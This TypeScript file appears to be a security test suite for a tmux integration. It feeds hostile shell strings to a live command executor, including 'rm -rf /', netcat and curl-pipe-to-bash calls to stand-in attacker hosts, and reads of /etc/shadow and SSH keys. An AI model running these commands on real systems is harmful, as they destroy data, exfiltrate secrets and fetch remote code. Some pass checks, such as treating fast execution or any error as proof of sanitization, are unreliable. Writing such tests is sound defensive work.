#!/usr/bin/env node

import { TmuxIntegration } from './TmuxIntegration';
import { performance } from 'perf_hooks';

interface SecurityTestResult {
  testName: string;
  passed: boolean;
  vulnerability?: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  details: string;
}

export class TmuxSecurityTests {
  private integration: TmuxIntegration;
  private results: SecurityTestResult[] = [];

  constructor() {
    this.integration = new TmuxIntegration({
      performanceMode: 'reliability',
      commandTimeout: 5000
    });
  }

  async runSecuritySuite(): Promise<SecurityTestResult[]> {
    console.log('🔒 Running tmux Security Test Suite...\n');
    
    await this.integration.initialize();

    // Command Injection Tests
    await this.testCommandInjection();
    await this.testShellEscaping();
    await this.testPathTraversal();
    
    // Process Security Tests
    await this.testPrivilegeEscalation();
    await this.testProcessIsolation();
    
    // Input Validation Tests
    await this.testInputSanitization();
    await this.testBufferOverflow();
    
    // Session Security Tests
    await this.testSessionHijacking();
    await this.testUnauthorizedAccess();

    await this.integration.cleanup();
    
    return this.results;
  }

  private async testCommandInjection(): Promise<void> {
    const maliciousCommands = [
      'echo test; rm -rf /', // Command chaining
      'echo test && sudo su', // Privilege escalation attempt
      'echo test | nc attacker.com 4444', // Data exfiltration
      'echo test; curl evil.com/script.sh | bash', // Remote code execution
      'echo "$(cat /etc/passwd)"', // File disclosure
      'echo test; python3 -c "import os; os.system(\\"rm -rf /\\")"', // Script injection
      'echo test; node -e "require(\\"child_process\\").exec(\\"curl evil.com\\")"' // Node injection
    ];

    for (const command of maliciousCommands) {
      try {
        const startTime = performance.now();
        await this.integration.executeCommand(command);
        const executionTime = performance.now() - startTime;

        // If command executes suspiciously fast, it might have been sanitized
        const wasSanitized = executionTime < 10;
        
        this.results.push({
          testName: 'Command Injection Prevention',
          passed: wasSanitized,
          vulnerability: wasSanitized ? undefined : 'Command injection possible',
          severity: 'critical',
          details: `Command: ${command.substring(0, 50)}... Execution time: ${executionTime.toFixed(2)}ms`
        });
      } catch (error) {
        // Error is expected for malicious commands
        this.results.push({
          testName: 'Command Injection Prevention',
          passed: true,
          severity: 'critical',
          details: `Command properly rejected: ${command.substring(0, 50)}...`
        });
      }
    }
  }

  private async testShellEscaping(): Promise<void> {
    const escapingAttempts = [
      'echo "test"; /bin/bash',
      'echo test && exec /bin/sh',
      'echo test; python3 -c "import pty; pty.spawn(\\"/bin/bash\\")"',
      'echo test; script -qc /bin/bash /dev/null'
    ];

    for (const command of escapingAttempts) {
      try {
        await this.integration.executeCommand(command);
        
        // Check if we can still execute normal commands
        const testResult = await this.integration.executeCommand('echo "normal_command"');
        const isNormalExecution = testResult.output?.includes('normal_command');
        
        this.results.push({
          testName: 'Shell Escaping Prevention',
          passed: isNormalExecution || false,
          vulnerability: isNormalExecution ? undefined : 'Shell escape possible',
          severity: 'critical',
          details: `Escape attempt: ${command.substring(0, 50)}...`
        });
      } catch (error) {
        this.results.push({
          testName: 'Shell Escaping Prevention',
          passed: true,
          severity: 'critical',
          details: `Shell escape properly blocked: ${command.substring(0, 50)}...`
        });
      }
    }
  }

  private async testPathTraversal(): Promise<void> {
    const traversalAttempts = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\SAM',
      '/etc/shadow',
      '${HOME}/.ssh/id_rsa',
      '$(pwd)/../sensitive_file'
    ];

    for (const path of traversalAttempts) {
      try {
        await this.integration.executeCommand(`cat "${path}"`);
        
        // If command succeeds, check if sensitive data was accessed
        const output = await this.integration.getOutput(10);
        const containsSensitiveData = output.includes('root:') || 
                                     output.includes('-----BEGIN') || 
                                     output.includes('SAM');
        
        this.results.push({
          testName: 'Path Traversal Prevention',
          passed: !containsSensitiveData,
          vulnerability: containsSensitiveData ? 'Path traversal successful' : undefined,
          severity: 'high',
          details: `Path: ${path}, Sensitive data exposed: ${containsSensitiveData}`
        });
      } catch (error) {
        this.results.push({
          testName: 'Path Traversal Prevention',
          passed: true,
          severity: 'high',
          details: `Path traversal blocked: ${path}`
        });
      }
    }
  }

  private async testPrivilegeEscalation(): Promise<void> {
    const escalationAttempts = [
      'sudo su',
      'su root',
      'sudo -i',
      'pkexec /bin/bash',
      'doas sh'
    ];

    for (const command of escalationAttempts) {
      try {
        const result = await this.integration.executeCommand(command);
        
        // Check if we gained elevated privileges
        const whoamiResult = await this.integration.executeCommand('whoami');
        const isPrivileged = whoamiResult.output?.includes('root') || 
                           whoamiResult.output?.includes('admin');
        
        this.results.push({
          testName: 'Privilege Escalation Prevention',
          passed: !isPrivileged,
          vulnerability: isPrivileged ? 'Privilege escalation successful' : undefined,
          severity: 'critical',
          details: `Command: ${command}, Elevated: ${isPrivileged}`
        });
      } catch (error) {
        this.results.push({
          testName: 'Privilege Escalation Prevention',
          passed: true,
          severity: 'critical',
          details: `Privilege escalation blocked: ${command}`
        });
      }
    }
  }

  private async testProcessIsolation(): Promise<void> {
    try {
      // Test if processes can access parent process information
      await this.integration.executeCommand('ps aux | grep tmux');
      const output = await this.integration.getOutput(50);
      
      // Check for process tree exposure
      const exposesProcessTree = output.includes('tmux-integration') || 
                                output.includes('node');
      
      this.results.push({
        testName: 'Process Isolation',
        passed: !exposesProcessTree,
        vulnerability: exposesProcessTree ? 'Process information leak' : undefined,
        severity: 'medium',
        details: `Process tree visibility: ${exposesProcessTree}`
      });
    } catch (error) {
      this.results.push({
        testName: 'Process Isolation',
        passed: true,
        severity: 'medium',
        details: 'Process isolation properly enforced'
      });
    }
  }

  private async testInputSanitization(): Promise<void> {
    const maliciousInputs = [
      'A'.repeat(10000), // Buffer overflow attempt
      '\x00\x01\x02\x03', // Null bytes and control characters
      '$(echo "command_substitution")', // Command substitution
      '`echo "backtick_substitution"`', // Backtick substitution
      '\"; echo "quote_escape"', // Quote escaping
      '\n\r\t\b\f', // Special characters
      '${IFS}echo${IFS}injection' // IFS injection
    ];

    for (const input of maliciousInputs) {
      try {
        await this.integration.executeCommand(`echo "${input}"`);
        const output = await this.integration.getOutput(10);
        
        // Check if input was properly sanitized
        const containsRawInput = output.includes('command_substitution') || 
                               output.includes('backtick_substitution') ||
                               output.includes('quote_escape') ||
                               output.includes('injection');
        
        this.results.push({
          testName: 'Input Sanitization',
          passed: !containsRawInput,
          vulnerability: containsRawInput ? 'Input not properly sanitized' : undefined,
          severity: 'high',
          details: `Input type: ${input.substring(0, 20)}..., Executed: ${containsRawInput}`
        });
      } catch (error) {
        this.results.push({
          testName: 'Input Sanitization',
          passed: true,
          severity: 'high',
          details: `Malicious input properly rejected: ${input.substring(0, 20)}...`
        });
      }
    }
  }

  private async testBufferOverflow(): Promise<void> {
    const bufferSizes = [1000, 10000, 100000, 1000000];
    
    for (const size of bufferSizes) {
      try {
        const largeInput = 'A'.repeat(size);
        const startTime = performance.now();
        
        await this.integration.executeCommand(`echo "${largeInput}"`);
        
        const executionTime = performance.now() - startTime;
        const output = await this.integration.getOutput(10);
        
        // Check for signs of buffer overflow (crashes, hangs, memory issues)
        const possibleOverflow = executionTime > 5000 || // Took too long
                               output.length === 0 || // No output (crash?)
                               output.includes('Segmentation fault') ||
                               output.includes('core dumped');
        
        this.results.push({
          testName: 'Buffer Overflow Protection',
          passed: !possibleOverflow,
          vulnerability: possibleOverflow ? 'Possible buffer overflow' : undefined,
          severity: 'high',
          details: `Buffer size: ${size}, Time: ${executionTime.toFixed(2)}ms, Overflow: ${possibleOverflow}`
        });
      } catch (error) {
        this.results.push({
          testName: 'Buffer Overflow Protection',
          passed: true,
          severity: 'high',
          details: `Large input properly handled: ${size} bytes`
        });
      }
    }
  }

  private async testSessionHijacking(): Promise<void> {
    try {
      // Create multiple sessions
      const session1 = await this.integration.createSession('test-session-1');
      const session2 = await this.integration.createSession('test-session-2');
      
      // Execute command in session 1
      await this.integration.executeCommand('echo "session1_secret"', session1.id);
      
      // Try to access session 1's output from session 2's context
      await this.integration.switchSession(session2.id);
      const output = await this.integration.getOutput(50);
      
      const canAccessOtherSession = output.includes('session1_secret');
      
      this.results.push({
        testName: 'Session Hijacking Prevention',
        passed: !canAccessOtherSession,
        vulnerability: canAccessOtherSession ? 'Session isolation breach' : undefined,
        severity: 'critical',
        details: `Cross-session access: ${canAccessOtherSession}`
      });
    } catch (error) {
      this.results.push({
        testName: 'Session Hijacking Prevention',
        passed: true,
        severity: 'critical',
        details: 'Session isolation properly enforced'
      });
    }
  }

  private async testUnauthorizedAccess(): Promise<void> {
    try {
      // Test access to non-existent session
      await this.integration.switchSession('non-existent-session-id');
      
      this.results.push({
        testName: 'Unauthorized Access Prevention',
        passed: false,
        vulnerability: 'Unauthorized session access allowed',
        severity: 'high',
        details: 'Successfully accessed non-existent session'
      });
    } catch (error) {
      this.results.push({
        testName: 'Unauthorized Access Prevention',
        passed: true,
        severity: 'high',
        details: 'Unauthorized access properly blocked'
      });
    }
  }

  generateSecurityReport(): string {
    const criticalIssues = this.results.filter(r => r.severity === 'critical' && !r.passed);
    const highIssues = this.results.filter(r => r.severity === 'high' && !r.passed);
    const allPassed = this.results.every(r => r.passed);
    
    let report = '# tmux Integration Security Assessment\n\n';
    
    report += '## Executive Summary\n\n';
    if (allPassed) {
      report += '✅ **SECURITY ASSESSMENT: PASS** - No critical security vulnerabilities detected\n\n';
    } else if (criticalIssues.length === 0) {
      report += '⚠️ **SECURITY ASSESSMENT: CONDITIONAL PASS** - No critical issues, but high-priority concerns exist\n\n';
    } else {
      report += '❌ **SECURITY ASSESSMENT: FAIL** - Critical security vulnerabilities detected\n\n';
    }
    
    report += `- **Critical Issues**: ${criticalIssues.length}\n`;
    report += `- **High Priority Issues**: ${highIssues.length}\n`;
    report += `- **Total Tests**: ${this.results.length}\n`;
    report += `- **Success Rate**: ${((this.results.filter(r => r.passed).length / this.results.length) * 100).toFixed(1)}%\n\n`;
    
    if (criticalIssues.length > 0) {
      report += '## 🚨 Critical Security Issues\n\n';
      for (const issue of criticalIssues) {
        report += `### ${issue.testName}\n`;
        report += `- **Vulnerability**: ${issue.vulnerability}\n`;
        report += `- **Details**: ${issue.details}\n`;
        report += `- **Severity**: ${issue.severity.toUpperCase()}\n\n`;
      }
    }
    
    if (highIssues.length > 0) {
      report += '## ⚠️ High Priority Issues\n\n';
      for (const issue of highIssues) {
        report += `### ${issue.testName}\n`;
        report += `- **Vulnerability**: ${issue.vulnerability}\n`;
        report += `- **Details**: ${issue.details}\n`;
        report += `- **Severity**: ${issue.severity.toUpperCase()}\n\n`;
      }
    }
    
    report += '## Detailed Test Results\n\n';
    for (const result of this.results) {
      const status = result.passed ? '✅' : '❌';
      report += `${status} **${result.testName}** (${result.severity})\n`;
      report += `   ${result.details}\n\n`;
    }
    
    report += '## Recommendations\n\n';
    if (criticalIssues.length > 0) {
      report += '### Immediate Actions Required\n';
      report += '1. **DO NOT DEPLOY** until critical issues are resolved\n';
      report += '2. Implement input sanitization and validation\n';
      report += '3. Add command execution restrictions\n';
      report += '4. Implement proper session isolation\n\n';
    }
    
    report += '### General Security Improvements\n';
    report += '1. Implement Content Security Policy for command execution\n';
    report += '2. Add audit logging for all command executions\n';
    report += '3. Implement rate limiting for command injection\n';
    report += '4. Add process sandboxing\n';
    report += '5. Regular security audits and penetration testing\n\n';
    
    return report;
  }
}

export async function runSecurityTests(): Promise<void> {
  const securityTests = new TmuxSecurityTests();
  
  try {
    const results = await securityTests.runSecuritySuite();
    const report = securityTests.generateSecurityReport();
    
    console.log(report);
    
    const fs = await import('fs/promises');
    await fs.writeFile('tmux-security-report.md', report);
    console.log('\n📄 Security report saved to tmux-security-report.md');
    
    // Exit with error code if critical issues found
    const criticalIssues = results.filter(r => r.severity === 'critical' && !r.passed);
    if (criticalIssues.length > 0) {
      process.exit(1);
    }
  } catch (error) {
    console.error('Security testing failed:', error);
    process.exit(1);
  }
}

if (require.main === module) {
  runSecurityTests();
}